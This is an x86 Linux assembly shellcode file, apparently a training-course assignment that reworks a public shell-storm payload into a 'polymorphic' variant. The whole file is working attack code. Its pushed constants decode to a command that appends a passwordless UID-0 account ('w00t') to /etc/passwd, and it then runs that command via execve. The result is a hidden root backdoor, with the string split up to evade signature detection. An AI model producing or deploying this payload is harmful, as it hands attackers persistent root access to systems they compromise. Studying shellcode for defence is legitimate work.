; A6 - Polymorphic Shellcode
; William Moody
; 31.12.2021
; PA-25640
; Original: http://shell-storm.org/shellcode/files/shellcode-543.php

global _start
section .text
_start:

	xor edx, edx		; EDX = 0
	push edx		; NULL (for envp)
	push edx		; Placeholder for pointer to "/bin/echo ..."
	push edx		; Placeholder for pointer to "-c"
	push edx		; Placeholder for pointer to "/bin/sh"
	
	push word dx		; ..
	push word 0x6477        ; "dw"
	push 0x73736170         ; "ssap"
	push 0x2f637465         ; "/cte"
	push 0x2f203e3e         ; "/ >>"
	push 0x20687361         ; " hsa"
	push 0x622f6e69         ; "b/ni"
	push 0x622f3a74         ; "b/:t"
	push 0x6f6f722f         ; "oor/"
	push 0x3a3a303a         ; "::0:"
	push 0x303a6564         ; "0:ed"
	push 0x306d6566         ; "0mef"
	push 0x34733a74         ; "4s:t"
	push 0x30307720         ; "00w "
	push 0x6f686365         ; "ohce"
	push 0x2f6e6962         ; "/nib"
	push 0x2f23632d         ; "/#c-"
	push 0x2368732f         ; "#hs/"
	push 0x6e69622f         ; "nib/"

	mov [esp + 0x7], dl	; Replacing '#' with '\x00'
	mov [esp + 0xa], dl	; ...

	mov [esp + 0x48], esp	; Write address of "/bin/sh" to memory
	lea ebx, [esp + 0x8]	; Load address of "-c" into EBX
	mov [esp + 0x4c], ebx	; Write address of "-c" to memory
	lea ebx, [esp + 0xb]	; Load address of "/bin/echo ..." into EBX
	mov [esp + 0x50], ebx	; Write address of "/bin/echo ..." to memory

	mov ebx, esp		; EBX => const char *pathname = "/bin/sh"

	mov eax, edx		; EAX = 0
	mov al, 0xb		; EAX = 0xB (SYS_EXECVE)
	lea ecx, [ebx + 0x48]	; ECX => char *const argv[] = *{'/bin/sh', '-c', '/bin/echo ...'}
	lea edx, [ebx + 0x54]	; EDX => char *const envp[] = *NULL

	int 0x80		; int execve(const char *pathname, char *const argv[], char *const envp[]);
